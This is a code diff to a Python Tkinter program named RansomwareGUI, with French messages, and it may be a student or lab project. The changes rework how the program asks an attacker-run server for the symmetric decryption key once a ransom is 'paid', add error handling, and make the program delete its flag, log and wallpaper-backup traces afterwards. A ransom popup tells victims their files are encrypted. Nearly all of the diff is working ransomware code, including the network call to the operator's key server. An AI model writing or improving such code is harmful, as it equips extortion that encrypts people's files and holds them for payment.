@@ -21,6 +21,7 @@ class RansomwareGUI:
     LOG_FILE = "interaction_log.txt"
     NEW_WALLPAPER = "new_wallpaper.jpg"
     OLD_WALLPAPER = "old_wallpaper.txt"
+    ENCRYPTION_FLAG = "encryption_done.flag"
 
     def __init__(self, root):
         self.root = root
@@ -112,12 +113,13 @@ class RansomwareGUI:
     def show_ransom_message(self):
         messagebox.showinfo("Ransomware", "Vos fichiers ont été chiffrés. Payez la rançon pour les déchiffrer.")
 
-    def request_symmetric_key(self):
+    """ def request_symmetric_key(self):
         if not self.server_ip:
+            print("Serveur non trouvé : self.server_ip est vide ou None")
             messagebox.showerror("Erreur", "Serveur non trouvé.")
             return
 
-        encrypted_symmetric_key_path = os.path.join(os.path.dirname(__file__), 'keys', 'encrypted_symmetric_key.bin')
+        encrypted_symmetric_key_path = os.path.join('keys', 'encrypted_symmetric_key.bin')
         with open(encrypted_symmetric_key_path, 'rb') as key_file:
             encrypted_symmetric_key = key_file.read()
 
@@ -130,7 +132,36 @@ class RansomwareGUI:
             symmetric_key = bytes.fromhex(response.json()['symmetric_key'])
             self.decrypt_files(symmetric_key)
         else:
-            messagebox.showerror("Erreur", "Le paiement n'a pas été effectué.")
+            messagebox.showerror("Erreur", "Le paiement n'a pas été effectué.") """
+
+    def request_symmetric_key(self):
+        try:
+            if not self.server_ip:
+                print("Serveur non trouvé : self.server_ip est vide ou None")
+                messagebox.showerror("Erreur", "Serveur non trouvé.")
+                return
+
+            encrypted_symmetric_key_path = os.path.join('keys', 'encrypted_symmetric_key.bin')
+            with open(encrypted_symmetric_key_path, 'rb') as key_file:
+                encrypted_symmetric_key = key_file.read()
+
+            response = requests.post(
+                f'http://{self.server_ip}:{self.server_port}/get_symmetric_key',
+                json={'paid': True, 'encrypted_symmetric_key': encrypted_symmetric_key.hex()}
+            )
+
+            if response.status_code == 200:
+                symmetric_key = bytes.fromhex(response.json()['symmetric_key'])
+                self.decrypt_files(symmetric_key)
+            else:
+                messagebox.showerror("Erreur", "Le paiement n'a pas été effectué.")
+
+        except requests.exceptions.ConnectionError:
+            messagebox.showerror("Erreur de connexion", "Impossible de se connecter au serveur.")
+        except Exception as e:
+            print(f"Exception levée : {e}")
+            messagebox.showerror("Erreur", f"Une erreur inattendue s'est produite : {e}")
+
 
 
     def decrypt_files(self, symmetric_key):
@@ -142,6 +173,12 @@ class RansomwareGUI:
         self.root.destroy()
         if os.path.exists(self.TIMER_FILE):
             os.remove(self.TIMER_FILE)
+        if os.path.exists(self.LOG_FILE):
+            os.remove(self.LOG_FILE)
+        if os.path.exists(self.OLD_WALLPAPER):
+            os.remove(self.OLD_WALLPAPER)
+        if os.path.exists(self.ENCRYPTION_FLAG):
+            os.remove(self.ENCRYPTION_FLAG)
 
     def discover_server(self):
         def broadcast_listener():
